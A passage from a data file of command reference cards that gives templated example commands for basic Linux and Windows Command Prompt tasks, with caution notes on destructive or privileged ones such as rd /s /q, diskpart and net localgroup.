 {"id":"lx-man","cat":"Linux Essentials","title":"man - manual pages / help","desc":"Read the built-in manual for a command.","tags":["linux","reference","teaching"],"code":{"linux":"man {{CMD:ls}}       # q to quit, / to search\n{{CMD:ls}} --help    # quick usage summary"}},
 {"id":"lx-clear","cat":"Linux Essentials","title":"clear - clear the terminal","desc":"Wipe the visible terminal screen.","tags":["linux","reference","teaching"],"code":{"linux":"clear            # or press Ctrl+L"}},
 {"id":"lx-watch","cat":"Linux Essentials","title":"watch - re-run a command periodically","desc":"Repeat a command every few seconds and watch it change.","tags":["linux","reference","teaching"],"code":{"linux":"watch -n 2 {{CMD:df -h}}    # every 2 seconds"}},
 {"id":"lx-tar","cat":"Linux Essentials","title":"tar - archive and extract","desc":"Bundle folders into an archive, or extract one.","tags":["linux","reference","teaching","backup"],"code":{"linux":"tar -czf {{OUT:backup.tar.gz}} {{DIR:folder}}   # create (gzip)\ntar -xzf {{OUT:backup.tar.gz}}                  # extract\ntar -tzf {{OUT:backup.tar.gz}}                  # list contents"}},
 {"id":"lx-gzip","cat":"Linux Essentials","title":"gzip / gunzip - compress a file","desc":"Compress or decompress a single file.","tags":["linux","reference","teaching","backup"],"code":{"linux":"gzip {{FILE:big.log}}       # -> big.log.gz (replaces original)\ngunzip {{FILE:big.log}}.gz"}},
 {"id":"lx-zip","cat":"Linux Essentials","title":"zip / unzip - zip archives","desc":"Create or extract .zip archives.","tags":["linux","reference","teaching","backup"],"code":{"linux":"zip -r {{OUT:files.zip}} {{DIR:folder}}\nunzip {{OUT:files.zip}} -d {{DIR:out/}}"}},
 {"id":"lx-mount","cat":"Linux Essentials","title":"mount / umount - mount filesystems","desc":"Attach or detach a disk/USB to a folder.","tags":["linux","reference","teaching"],"code":{"linux":"mount                                 # what's mounted\nsudo mount {{DEV:/dev/sdb1}} {{MNT:/mnt}}\nsudo umount {{MNT:/mnt}}"},"danger":"Unmount cleanly before removing media to avoid data loss."},
 {"id":"wcmd-dir","cat":"Windows Essentials","title":"dir - list directory contents","desc":"List files and folders in the current directory.","tags":["windows","reference","teaching"],"code":{"cmd":"dir\ndir /a                 # include hidden/system\ndir /s /b {{NAME:*.log}}   # recurse, bare full paths"}},
 {"id":"wcmd-cd","cat":"Windows Essentials","title":"cd / chdir - change directory","desc":"Move between folders (and drives) at the prompt.","tags":["windows","reference","teaching"],"code":{"cmd":"cd {{DIR:C:\\Users}}\ncd ..\ncd \\           # root of current drive\n{{DRIVE:D:}}     # switch to another drive"}},
 {"id":"wcmd-md","cat":"Windows Essentials","title":"md / mkdir - make a directory","desc":"Create a new folder (parents included).","tags":["windows","reference","teaching"],"code":{"cmd":"md {{DIR:project}}\nmkdir a\\b\\c    # creates the whole path"}},
 {"id":"wcmd-rd","cat":"Windows Essentials","title":"rd / rmdir - remove a directory","desc":"Delete a folder, optionally with everything in it.","tags":["windows","reference","teaching"],"code":{"cmd":"rd {{DIR:olddir}}\nrd /s /q {{DIR:folder}}    # recursive, no prompt"},"danger":"/s /q deletes everything inside without confirmation."},
 {"id":"wcmd-del","cat":"Windows Essentials","title":"del / erase - delete files","desc":"Delete one or more files (no recycle bin).","tags":["windows","reference","teaching"],"code":{"cmd":"del {{FILE:file.txt}}\ndel /s /q {{NAME:*.tmp}}    # recurse, no prompt"},"danger":"Deleted files bypass the Recycle Bin."},
 {"id":"wcmd-copy","cat":"Windows Essentials","title":"copy - copy files","desc":"Copy one or more files to another location.","tags":["windows","reference","teaching"],"code":{"cmd":"copy {{SRC:a.txt}} {{DST:b.txt}}\ncopy *.txt {{DIR:C:\\backup}}"}},
 {"id":"wcmd-xcopy","cat":"Windows Essentials","title":"xcopy - copy files and folder trees","desc":"Copy whole directory trees, including subfolders.","tags":["windows","reference","teaching"],"code":{"cmd":"xcopy {{SRC:C:\\src}} {{DST:D:\\dst}} /E /I /H   # /E subdirs, /I assume dir, /H hidden"}},
 {"id":"wcmd-move","cat":"Windows Essentials","title":"move - move or rename","desc":"Move files to another folder, or rename them.","tags":["windows","reference","teaching"],"code":{"cmd":"move {{SRC:old.txt}} {{DST:new.txt}}\nmove *.log {{DIR:C:\\logs}}"}},
 {"id":"wcmd-ren","cat":"Windows Essentials","title":"ren / rename - rename a file","desc":"Rename a file or folder in place.","tags":["windows","reference","teaching"],"code":{"cmd":"ren {{FILE:old.txt}} {{NEW:new.txt}}"}},
 {"id":"wcmd-type","cat":"Windows Essentials","title":"type - print a file's contents","desc":"Display a text file at the prompt.","tags":["windows","reference","teaching"],"code":{"cmd":"type {{FILE:file.txt}}"}},
 {"id":"wcmd-more","cat":"Windows Essentials","title":"more - page through output","desc":"Show output one screen at a time.","tags":["windows","reference","teaching"],"code":{"cmd":"more {{FILE:big.txt}}\ndir | more"}},
 {"id":"wcmd-tree","cat":"Windows Essentials","title":"tree - show a directory tree","desc":"Display folders (and optionally files) as a tree.","tags":["windows","reference","teaching"],"code":{"cmd":"tree\ntree /F        # include files"}},
 {"id":"wcmd-attrib","cat":"Windows Essentials","title":"attrib - view/change file attributes","desc":"Show or set read-only, hidden, system attributes.","tags":["windows","reference","teaching"],"code":{"cmd":"attrib {{FILE:file.txt}}\nattrib +h {{FILE:file.txt}}        # hide\nattrib -r -h -s {{FILE:file.txt}}   # clear flags"}},
 {"id":"wcmd-fc","cat":"Windows Essentials","title":"fc - compare two files","desc":"Show the differences between two files.","tags":["windows","reference","teaching"],"code":{"cmd":"fc {{A:file1.txt}} {{B:file2.txt}}"}},
 {"id":"wcmd-where","cat":"Windows Essentials","title":"where - locate a command or file","desc":"Find where a program or file lives on the PATH/disk.","tags":["windows","reference","teaching"],"code":{"cmd":"where {{CMD:python}}\nwhere /r C:\\ {{NAME:*.dll}}"}},
 {"id":"wcmd-cls","cat":"Windows Essentials","title":"cls - clear the screen","desc":"Clear the Command Prompt window.","tags":["windows","reference","teaching"],"code":{"cmd":"cls"}},
 {"id":"wcmd-ver","cat":"Windows Essentials","title":"ver - Windows version","desc":"Print the Windows version string.","tags":["windows","reference","teaching"],"code":{"cmd":"ver"}},
 {"id":"wcmd-set","cat":"Windows Essentials","title":"set - environment variables","desc":"List or set environment variables for the session.","tags":["windows","reference","teaching"],"code":{"cmd":"set                        # list all\nset {{VAR:MYVAR}}={{VAL:hello}}\necho %{{VAR:MYVAR}}%"}},
 {"id":"wcmd-tasklist","cat":"Windows Essentials","title":"tasklist - list running processes","desc":"Show running processes, PIDs, and memory.","tags":["windows","reference","teaching","process"],"code":{"cmd":"tasklist\ntasklist /svc\ntasklist /fi \"imagename eq {{NAME:chrome.exe}}\""}},
 {"id":"wcmd-taskkill","cat":"Windows Essentials","title":"taskkill - stop a process","desc":"End a process by PID or image name.","tags":["windows","reference","teaching","process"],"code":{"cmd":"taskkill /pid {{PID:1234}} /f\ntaskkill /im {{NAME:notepad.exe}} /f"},"danger":"/f force-terminates - unsaved work is lost."},
 {"id":"wcmd-sc","cat":"Windows Essentials","title":"sc - manage Windows services","desc":"Query, start, stop, or configure services.","tags":["windows","reference","teaching"],"code":{"cmd":"sc query {{SVC:Spooler}}\nsc start {{SVC:Spooler}}\nsc stop {{SVC:Spooler}}\nsc config {{SVC:Spooler}} start= auto"}},
 {"id":"wcmd-shutdown","cat":"Windows Essentials","title":"shutdown - power off / restart","desc":"Shut down or restart the computer.","tags":["windows","reference","teaching"],"code":{"cmd":"shutdown /s /t 0       # shut down now\nshutdown /r /t 0       # restart now\nshutdown /a            # abort a pending shutdown"},"danger":"Ends the session immediately with /t 0."},
 {"id":"wcmd-driverquery","cat":"Windows Essentials","title":"driverquery - installed drivers","desc":"List installed device drivers.","tags":["windows","reference","teaching"],"code":{"cmd":"driverquery\ndriverquery /v         # verbose"}},
 {"id":"wcmd-gpupdate","cat":"Windows Essentials","title":"gpupdate - refresh Group Policy","desc":"Reapply Group Policy without waiting for the cycle.","tags":["windows","reference","teaching"],"code":{"cmd":"gpupdate /force"}},
 {"id":"wcmd-chkdsk","cat":"Windows Essentials","title":"chkdsk - check a disk","desc":"Scan a drive for filesystem errors.","tags":["windows","reference","teaching"],"code":{"cmd":"chkdsk {{DRIVE:C:}}\nchkdsk {{DRIVE:C:}} /f /r     # fix errors (schedules on reboot for C:)"},"danger":"/f /r on the system drive schedules a reboot scan."},
 {"id":"wcmd-diskpart","cat":"Windows Essentials","title":"diskpart - disk & partition tool","desc":"Interactively manage disks, partitions, and volumes.","tags":["windows","reference","teaching"],"code":{"cmd":"diskpart\nDISKPART> list disk\nDISKPART> select disk {{N:1}}\nDISKPART> list partition"},"danger":"Can erase partitions/data. Confirm the disk number carefully."},
 {"id":"wcmd-sfc","cat":"Windows Essentials","title":"sfc - system file checker","desc":"Scan for and repair corrupted Windows system files.","tags":["windows","reference","teaching"],"code":{"cmd":"sfc /scannow"}},
 {"id":"wcmd-hostname","cat":"Windows Essentials","title":"hostname - show the computer name","desc":"Print this computer's name.","tags":["windows","reference","teaching"],"code":{"cmd":"hostname"}},
 {"id":"wcmd-whoami","cat":"Windows Essentials","title":"whoami - current user, groups & privileges","desc":"Show the current account and its rights.","tags":["windows","reference","teaching","account"],"code":{"cmd":"whoami\nwhoami /groups\nwhoami /priv"}},
 {"id":"wcmd-net-user","cat":"Windows Essentials","title":"net user - local user accounts","desc":"List, view, or create local user accounts.","tags":["windows","reference","teaching","account"],"code":{"cmd":"net user                          # list accounts\nnet user {{USER:alice}}             # account details\nnet user {{USER:alice}} * /add      # create (prompts for password)"},"danger":"Adds/changes accounts; run as Administrator."},
 {"id":"wcmd-net-localgroup","cat":"Windows Essentials","title":"net localgroup - local groups","desc":"List groups or manage group membership.","tags":["windows","reference","teaching","account"],"code":{"cmd":"net localgroup\nnet localgroup Administrators\nnet localgroup Administrators {{USER:alice}} /add   # grant admin"},"danger":"Adding a user to Administrators grants full local control."},
 {"id":"wcmd-net-startstop","cat":"Windows Essentials","title":"net start / stop - services","desc":"Start or stop a Windows service by name.","tags":["windows","reference","teaching"],"code":{"cmd":"net start                     # list running services\nnet start {{SVC:Spooler}}\nnet stop {{SVC:Spooler}}"}},
 {"id":"wcmd-net-use","cat":"Windows Essentials","title":"net use - map network drives","desc":"Connect, list, or disconnect network shares.","tags":["windows","reference","teaching","network"],"code":{"cmd":"net use\nnet use {{DRIVE:Z:}} \\\\{{HOST:server}}\\{{SHARE:share}}\nnet use {{DRIVE:Z:}} /delete"}}
];
